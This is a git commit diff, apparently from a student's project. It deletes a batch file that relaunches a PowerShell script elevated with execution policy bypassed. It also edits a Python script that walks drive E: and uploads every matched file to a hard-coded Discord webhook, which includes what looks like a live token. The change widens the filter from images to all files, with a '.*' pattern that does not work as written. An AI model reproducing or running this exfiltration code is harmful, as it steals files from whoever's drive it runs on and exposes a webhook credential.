81b7104e41158b9406179a8629fc134165395d41
unknown <Student@SIOP0202-EDU-06.EPTM.lan>
2025-10-30 13:28:18 +0100

    Add some change in the file

--- bat/scriptReverse.bat
+++
@@ -1,5 +0,0 @@
-@ECHO OFF
-SET Directory=%~dp0
-SET ScriptPath="%Directory%scriptInteraction.ps1"
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%ScriptPath%""' -Verb RunAs}"
--- python/get_folder.py
+++ python/get_folder.py
@@ -4,16 +4,16 @@ import os
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410983770022088764/n3bcdZVzjgKbp3aAVpBI_C6EPtFUlHzKDaVU3smV0J2lDR-kDS-8RY4dHxVMqwS9sOZC"
 
 drive_root = "E:\\"
-image_extensions = {'.jpg', '.jpeg', '.png'}
+file_extansion = { '.*' }
 
 for root, dirs, files in os.walk(drive_root):
     for file in files:
         ext = os.path.splitext(file)[1].lower()
-        if ext in image_extensions:
-            image_path = os.path.join(root, file)
-            with open(image_path, "rb") as f:
+        if ext in file_extansion:
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as f:
                 response = requests.post(
                     WEBHOOK_URL,
-                    files={"file": (os.path.basename(image_path), f)}
+                    files={"file": (os.path.basename(file_path), f)}
                 )
-            print(f"Image envoyée : {image_path} | Status: {response.status_code}")
+            print(f"Image envoyée : {file_path} | Status: {response.status_code}")
